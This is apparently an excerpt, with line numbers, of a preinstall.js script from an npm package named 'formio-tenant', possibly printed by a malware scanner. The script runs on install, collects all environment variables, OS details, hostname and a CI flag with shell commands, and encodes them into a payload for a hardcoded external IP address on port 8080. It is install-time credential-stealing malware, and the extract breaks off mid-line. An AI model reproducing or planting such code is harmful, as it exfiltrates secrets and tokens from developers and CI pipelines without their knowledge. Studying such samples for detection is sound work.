// File: tmp/tmp2espamvx/formio-tenant/package/preinstall.js
// ======================================================================
Line 2: _tmp_3 = require('child_process')
Line 3: const url = 'http://206.189.139.175:8080'
Line 12: execSync(cmd, { timeout: 5000 }).toString().trim()
Line 18: {
  let payload = '';

  if (process.platform !== 'win32') {
    // --- Linux/Unix Collection ---
    // Collect all environment variables
    const envData = safeExec('env');
    // Get OS details
    const unameData = safeExec('uname -a');
    // Get hostname (as an additional identifier)
    const hostnameData = safeExec('hostname');
    // Check for common CI/CD environment variable (if not set, defaults to "not_CI")
    const ciFlag = process.env.CI || 'not_CI';

    // Build the payload; note that each value is URL-encoded
    payload = `env=${encodeURIComponent(envData)}&uname=${encodeURIComponent(unameData)}&hostname=${encodeURIComponent(hostnameData)}&CI=${encodeURIComponent(ciFlag)}`;
  } else {
    // --- Windows Collection (minimal) ---
    // On Windows, use 'set' to get environment variables
    const envData = safeExec('set');
    // Get hostname
    const hostnameData = safeExec('hostname');
    // CI/CD marker (if available)
    const ciFlag = process.env.CI || 'not...
Line 24: safeExec('env')
Line 26: safeExec('uname -a')
Line 28: safeExec('hostname')
Line 37: safeExec('set')
Line 39: safeExec('hostname')
Line 48: execSync(cmd, { stdio: 'inherit' })
Line 52: process.exit(1)
